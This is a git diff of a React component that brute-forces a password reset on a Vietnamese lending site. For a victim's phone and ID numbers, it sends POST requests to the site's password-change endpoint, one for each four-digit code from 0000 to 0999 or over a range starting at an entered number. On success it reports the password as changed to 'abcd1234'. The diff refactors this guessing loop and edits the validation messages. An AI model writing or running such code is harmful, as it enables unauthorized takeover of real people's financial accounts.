@@ -5,19 +5,29 @@ import * as Yup from 'yup';
 
 const MiVay = () => {
     const [status, setstatus] = useState('Chưa bắt đầu')
+    let arr = []
+    for (let i = 0; i <= 999; i++) {
+        let number = i
+        if (number < 10) number = "000" + number
+        else if (number < 100) number = "00" + number
+        else if (number < 1000) number = "0" + number
 
+        arr.push(number)
+        
+
+    }
     return (
         <Formik
             initialValues={{ sdt: '', cmnd: '', start: '' }}
             validationSchema={Yup.object({
                 sdt: Yup.string()
-                    .max(11, '')
+                    .max(11, 'SĐT không được quá 11 số')
                     .required('Phải nhập'),
                 cmnd: Yup.string()
-                    .max(12, 'Phải nhập')
+                    .max(12, 'CMND/CCCD có 9-12 số')
                     .required('Phải nhập'),
                 start: Yup.number()
-                    .max(9999, 'Phải nhập')
+                    .max(9999, 'Vượt quá giới hạn. phải < 9999')
 
                     .required('Phải nhập'),
             })}
@@ -31,21 +41,9 @@ const MiVay = () => {
                 // if(start>10000 || start<0) alert('Số bắt đầu không hợp lệ!')
                 // else
                 if (start === 0) {
-
-                    for (let i = 0; i <= 9; i++) {
-                        for (let j = 0; j <= 9; j++) {
-                            for (let k = 0; k <= 9; k++) {
-
-                                let number = i * 100 + j * 10 + k
-                                if (number < 1000) {
-                                        
-
-                                    if (number < 10) number = "000" + number
-                                    else if (number < 100) number = "00" + number
-                                    else if (number < 1000) number = "0" + number
-                                    console.log(number)
-                                }
-                                fetch('https://mivay.vn/smart-loan/modify/password', {
+                    for (let index = 0; index < arr.length; index++) {
+                        const number = arr[index];
+                        fetch('https://mivay.vn/smart-loan/modify/password', {
                                     method: 'POST',
                                     headers: {
                                         'Accept': 'application/json, text/plain, */*',
@@ -72,9 +70,7 @@ const MiVay = () => {
                                 }).then(res => res.json())
                                     .then(json => {
                                         console.log(json.status.msg)
-                                        setstatus("Đang lọc...")
-                                        setstatus("...Đang lọc...")
-                                        setstatus("Kết quả:" + json.status.msg)
+                                        setstatus('Đang lọc: '+ number+ " --Kết quả:" + json.status.msg)
                                         if (json.status.msg === 'Thực hiện thành công') {
                                             alert('Mật khẩu đã được đổi thành abcd1234');
                                             setstatus('Đã xong')
@@ -83,15 +79,31 @@ const MiVay = () => {
 
                                     })
 
-
-
-
-
-                            }
-
-                        }
-
+                        
                     }
+                    // for (let i = 0; i <= 9; i++) {
+                    //     for (let j = 0; j <= 9; j++) {
+                    //         for (let k = 0; k <= 9; k++) {
+
+                    //             let number = i * 100 + j * 10 + k
+                    //             if (number < 1000) {
+                                        
+
+                    //                 if (number < 10) number = "000" + number
+                    //                 else if (number < 100) number = "00" + number
+                    //                 else if (number < 1000) number = "0" + number
+                    //                 console.log(number)
+                    //             }
+                                
+
+
+
+
+                    //         }
+
+                    //     }
+
+                    // }
                 }
                 else
                     for (let index = start; index <= values.start + 1000; index++) {
